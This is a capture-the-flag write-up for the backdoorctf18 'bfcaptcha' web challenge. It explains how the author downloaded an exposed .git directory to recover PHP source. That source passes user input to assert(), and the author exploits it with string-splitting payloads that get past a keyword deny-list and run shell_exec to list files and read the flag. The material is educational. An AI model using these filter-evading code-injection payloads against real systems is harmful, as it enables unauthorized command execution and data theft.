---
layout: post
categories: security
title: [backdoorctf18] [Web 150 - bfcaptcha] 

---

## A. Problem Description

#### Category : Web Exploitation
#### Points : 150 pts
#### Tags : Remote Code Execution, Brainfuck, .git
#### Language : PHP
#### Contest Date : March 18, 2018

Target : http://51.15.73.163:13335/index.php

Given brainfuck code. We should evaluate that expression and submit the answer into answer form. Don't forget we should solve the audio captcha too. And the captcha sounds disgusting since it was too fast lol.

Here is the snapshot of the web

![an image alt text]({{ awidardi.github.io }}/images/ctf/2018-03-20-backdoorctf18-web150/problem.PNG "Problem's Snapshot")

## B. Reconnaissance and Scanning Vulnerabilities

#### .git exploitation

From the problem's description, it is said that the web administrator loves to version control and blah blah blah. From this sentence, i have some feeling about versioning. 
Thus I tried some file backup like
* http://51.15.73.163:13335/index.php~ (gedit backup file)
* http://51.15.73.163:13335/index.php.swp (vim backup file)
* http://51.15.73.163:13335/index.php.bak (bak backup file)

From all tries, i failed to get all of them. So let's try to grab its .git files. So I tried to access http://51.15.73.163:13335/.git and gotcha, I got its .git files
![an image alt text]({{ awidardi.github.io }}/images/ctf/2018-03-20-backdoorctf18-web150/git.PNG ".git's Snapshot")

#### What should I do next?

From .git files, you can track all of their files history. So let's try to grab all of that files

```bash
/* Grab .git files */
wget -r -np -nH -R index.html http://51.15.73.163:13335/.git/
```

#### Explanation : 
* -r : download recursively
* -np : no parent
* -nH : don't save to hostname folder
* -R index.html : exclude file index.html

After get the .git folder, let's go to the folder and type "git status"
We should see deleted index.php files. The screenshot should be like this

![an image alt text]({{ awidardi.github.io }}/images/ctf/2018-03-20-backdoorctf18-web150/deleted index.php.PNG ".git's Snapshot")

#### TL.DR , extract that index.php by typing "git checkout -- ."
You can learn how to extract .git files with this tutorial : [.git extracting tutorial](https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/).

```php
<?php
session_start();

function get_question(){
	$answer = array();
	foreach(file("xxxxxxxxx") as $line) {
   		array_push($answer, trim($line));
	}
	$random_index = rand(0, 999);
	$question = file_get_contents("xxxxxxxx/$random_index");
	$_SESSION['quesans'] = $answer[$random_index];
	return $question;
}

function bad_hacking_penalty(){
	$_SESSION['count'] = 0;
}

function handle_invalid_captcha_ans(){
	$_SESSION['count'] = 0;
}

function is_clean($input){
	if (preg_match("/SESSION/i", $input)){//no seesion variable alteration
		bad_hacking_penalty();
		return false;
	}
	if (preg_match('/(base64_|eval|system|shell_|exec|php_)/i', $input)){//no coomand injection 
		bad_hacking_penalty();
		return false;
	}
	if (preg_match('/(file|echo|die|print)/i', $input)){//no file access
		bad_hacking_penalty();
		return false;
	}
	if (preg_match("/(or|\|)/", $input)){//Be brave use AND
		bad_hacking_penalty();
		return false;
	}
	if (preg_match('/(flag)/i', $input)){//don't take shortcuts
		bad_hacking_penalty();
		return false;
	}
	//clean input
	return true;
}

function random_string(){
	$captcha_file = "xxxxxxxx";
	$random_index = rand(0, 999);
	$i = 1;
	foreach(file($captcha_file) as $line) {
   		if ($i == $random_index) return $line;
   		$i++;
	}
}

//current captcha to be verified against user input
$cur_captcha = $_SESSION['captcha'];
//set captcha for next try
$next_captcha = rtrim(random_string());
$_SESSION['captcha'] = $next_captcha;
$captcha_url = "xxxxxxxxx" . md5('xxxxxxxxxxxx' . $next_captcha);

$invalid_ans = 0;
$invalid_captcha = 0;
if (isset($_SESSION['count']) && isset($_POST['captcha']) && $_POST['captcha'] != ''){
	$user_captcha = $_POST['captcha'];
	if($cur_captcha === $user_captcha){
		$user_ans = $_POST['answer'];
		$real_ans = $_SESSION['quesans'];
			if (is_clean($user_ans)){
				(assert("'$real_ans' === '$user_ans'") and $_SESSION['count'] +=1) or (handle_invalid_captcha_ans() or $invalid_ans = 1);

			}else{
				die('Detected hacking attempt');
			}
	}else{
		handle_invalid_captcha_ans();
		$invalid_captcha = 1;
		}
}else{
	handle_invalid_captcha_ans();
}


if (!isset($_SESSION['count'])){
	$_SESSION['count'] = 0;
}

?>

<html>
<head>
	<title></title>
</head>
<body>
<div name="ques">
Can y0u print something out of this brain-fucking c0de?<br>
<?php echo htmlspecialchars(get_question());?>
</div>
<form method="post" action="index.php">
	Answer: <input type="text" placeholder="Answer the question" name="answer"> <br><br>
	<audio controls>
  		<source src=<?php echo $captcha_url;?> type="audio/mpeg">
	</audio><br>
	Captcha: <input type="text" placeholder="Enter the captcha " name="captcha">
	<button type="submit">Submit</button>
</form>
<?php
 if ($_SESSION['count'] == 0){
 	echo "e.g Type '" . $next_captcha ."' for the given captcha";
 }
 if ($_SESSION['count'] >= 500 ){
 	include 'xxxxxxxxxxxxxx';
 	echo $random_flag_name;
 }else{
 	echo '<br>You\'ve made ' . ($_SESSION['count']) . ' correct answers';
 }
 if($invalid_ans){
 	echo '<br><b>Wrong Answer</b>';
 }else if($invalid_captcha){
 	echo '<br><b>Wrong Captcha</b>';
 }
?>

</body>
</html>

```
#### Analyzing the code

By analyzing the code given above, we could get some informations 
* The flag is probably in $random_flag_name
* We can get the flag after solving 500 questions. **But should we bruteforce?**
* We can only control the value of $_POST('captcha') and $_POST('answer')
* Our input got checked first in is_clean method before asserted

We get the point! Let's focus on 2 codes here

```php
if (isset($_SESSION['count']) && isset($_POST['captcha']) && $_POST['captcha'] != ''){
	$user_captcha = $_POST['captcha'];
	if($cur_captcha === $user_captcha){
		$user_ans = $_POST['answer'];
		$real_ans = $_SESSION['quesans'];
			if (is_clean($user_ans)){
				(assert("'$real_ans' === '$user_ans'") and $_SESSION['count'] +=1) or (handle_invalid_captcha_ans() or $invalid_ans = 1);

			}else{
				die('Detected hacking attempt');
			}
	}else{
		handle_invalid_captcha_ans();
		$invalid_captcha = 1;
		}
}else{
	handle_invalid_captcha_ans();
}

```

```php
function is_clean($input){
	if (preg_match("/SESSION/i", $input)){//no seesion variable alteration
		bad_hacking_penalty();
		return false;
	}
	if (preg_match('/(base64_|eval|system|shell_|exec|php_)/i', $input)){//no coomand injection 
		bad_hacking_penalty();
		return false;
	}
	if (preg_match('/(file|echo|die|print)/i', $input)){//no file access
		bad_hacking_penalty();
		return false;
	}
	if (preg_match("/(or|\|)/", $input)){//Be brave use AND
		bad_hacking_penalty();
		return false;
	}
	if (preg_match('/(flag)/i', $input)){//don't take shortcuts
		bad_hacking_penalty();
		return false;
	}
	//clean input
	return true;
}
```

From those 2 codes, we can conclude that after our answer is being input, our input is checked by function is_clean. If our input is "clean", we can assert the value of real_ans with our answer. Now analyzing this code 

```php
assert("'$real_ans' === '$user_ans'")
```
Since assert function will evaluate the string inside that function, we can see that our input is directly checked with variable real_ans without any filter. Thus this could cause Remote Code Execution (RCE).

So let's try to give our input like this $user_ans 

```php
<answer>' and assert("ec"."ho 'test'") and '1
// <answer> is the real answer after evaluating the brainfuck code, so we still have to interpret that code.
```
If we insert above payload into our answer form, we should have our code to be like this 

```php
assert("
	'$real_ans' === '<answer>' and 
	assert("ec"."ho 'test'") 
	and '1'
	") 
and $_SESSION['count'] +=1 or (handle_invalid_captcha_ans() or $invalid_ans = 1);
```

See? We aim to try RCE with another assert in that answer variable. Since echo is banned and filtered by function is_clean, so we could split "echo 'test'" into "ec"."ho 'test'"

## C. Exploitation

#### First Payload

```php
<answer>' and assert("ec"."ho 'test'") and '1

```

We have two form, for the first, we are given the free captcha to be input. Just see at message 'Type '663716' for the given captcha'. So let's try our first exploit, by injecting above code into answer form, we can get 

```html
test
Can y0u print something out of this brain-fucking c0de?
++++++++++[ > +++++++++++ < -]>++++++++.[-]++++++++++[ > +++++++++++ < -]>+.[-]++++++++++[ > ++++++++++ < -]>+++++.[-]++++++++++[ > ++++++++++ < -]>.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > ++++++++++ < -]>+++++++++.[-]++++++++++[ > +++++++++ < -]>+++++++.[-]++++++++++[ > ++++++++++ < -]>+++++.[-]++++++++++[ > +++++++++++ < -]>.[-]++++++++++[ > ++++ < -]>.[-]++++++++++[ > ++++ < -]>+.[-]++++++++++[ > ++++++++++++ < -]>+++.[-]++++++++++[ > + < -]>.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > ++++++++++ < -]>+.[-]++++++++++[ > ++++++++++++ < -]>.[-]++++++++++[ > +++++++++++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > ++++++ < -]>+.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++++ < -]>+++.[-]++++++++++[ > +++++ < -]>++++++.[-]++++++++++[ > +++++ < -]>++.[-]++++++++++[ > +++++ < -]>+.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > ++++ < -]>+++.[-]++++++++++[ > +++++ < -]>+++.[-]++++++++++[ > ++++ < -]>++++++++.[-]++++++++++[ > +++++ < -]>+++++++.[-]++++++++++[ > +++++ < -]>+++.[-]++++++++++[ > +++++ < -]>+.[-]++++++++++[ > ++++ < -]>+++.[-]++++++++++[ > +++++ < -]>+++.[-]++++++++++[ > +++++ < -]>+.[-]++++++++++[ > +++++ < -]>++++.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > +++++ < -]>+.[-]++++++++++[ > ++++ < -]>++.[-]++++++++++[ > +++++ < -]>.[-]++++++++++[ > +++++ < -]>.[-]++++++++++[ > +++++ < -]>+++.[-]++++++++++[ > ++++ < -]>+++++++++.[-]++++++++++[ > ++++ < -]>+++++++++.[-]++++++++++[ > ++++ < -]>+++.[-]++++++++++[ > +++++ < -]>+++++++.[-]++++++++++[ > +++++ < -]>++++++.[-]++++++++++[ > +++++ < -]>++++.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > ++++ < -]>++++++++.[-]++++++++++[ > ++++ < -]>+++.[-]++++++++++[ > +++++ < -]>+++.[-]++++++++++[ > +++++ < -]>++.[-]++++++++++[ > +++++ < -]>++.[-]++++++++++[ > +++++ < -]>++++.[-]++++++++++[ > +++++ < -]>++++.[-]++++++++++[ > ++++ < -]>+++.[-]++++++++++[ > ++++ < -]>+++++++++.[-]++++++++++[ > ++++ < -]>++++++++.[-]++++++++++[ > +++++ < -]>.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > ++++ < -]>++++++++.[-]++++++++++[ > ++++ < -]>++.[-]++++++++++[ > +++++ < -]>++.[-]++++++++++[ > +++++ < -]>+.[-]++++++++++[ > +++++ < -]>+++++.[-]++++++++++[ > ++++ < -]>+++++++++.[-]++++++++++[ > +++++ < -]>++.[-]++++++++++[ > ++++ < -]>+++.[-]++++++++++[ > +++++ < -]>++.[-]++++++++++[ > +++++ < -]>+.[-]++++++++++[ > +++++ < -]>.[-]++++++++++[ > +++++ < -]>.[-]++++++++++[ > +++++ < -]>++++++.[-]++++++++++[ > + < -]>.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++ < -]>++.[-]++++++++++[ > +++++++++++ < -]>++.[-]++++++++++[ > +++++++++++ < -]>++++.[-]++++++++++[ > ++++++++++ < -]>+++++.[-]++++++++++[ > +++++++++++ < -]>.[-]++++++++++[ > +++++++++++ < -]>++++++.[-]++++++++++[ > ++++++++++ < -]>++.[-]++++++++++[ > ++++ < -]>.[-]++++++++++[ > ++++++++++ < -]>+.[-]++++++++++[ > ++++++++++++ < -]>.[-]++++++++++[ > +++++++++++ < -]>++.[-]++++++++++[ > ++++ < -]>+.[-]++++++++++[ > +++++ < -]>+++++++++.[-]++++++++++[ > + < -]>.[-]++++++++++[ > ++++++++++++ < -]>+++++.[-]
Answer: 
Answer the question
 


Captcha: 
Enter the captcha 
  Submit
e.g Type '427246' for the given captcha
You've made 0 correct answers
```

#### Second Payload
So out first payload is successfully ran into the php

So let's try another payload to find what file are inside it

Payload :
```php
<answer>' and assert("pr"."int she"."ll_ex"."ec('ls -lsart')") and '1
```

After inserting that payload, we can get
![an image alt text]({{ awidardi.github.io }}/images/ctf/2018-03-20-backdoorctf18-web150/payload2.PNG "Payload 2's Snapshot")

#### Third Payload
After we see their directory, let's find out what's inside the random_flag_name.php file. So let's insert our payload to be like this

```php
<answer>' and assert("pr"."int she"."ll_ex"."ec('cat random_fl"."ag_fi"."le.p"."hp')") and '1

// Don't forget that we should split word print, shell_exec, flag, and php
```

By injecting that code, we can get the flag
![an image alt text]({{ awidardi.github.io }}/images/ctf/2018-03-20-backdoorctf18-web150/payload3.PNG "Payload 3's Snapshot")

## D. Conclusion
I think this problem is quite challenging but not difficult. We just have to be very careful with single quote and double quote characters since it may causes your code injection to be failed.
But it is very good for you that still learning about RCE. And in this challenge, you can know how dangerous your website will be if you upload your .git file into your website.
Please leave any comment, critics, or suggestion if you have something to say.

## E. References and Tools Used

#### References
* [PHP Assert](http://php.net/manual/en/function.assert.php)
* [.git extracting tutorial](https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/)
* [Code Injection](https://www.owasp.org/index.php/Code_Injection)

#### Tools Used
* Windows Subsytem for Linux Ubuntu
* [Brainfuck decoder](https://www.dcode.fr/brainfuck-language)
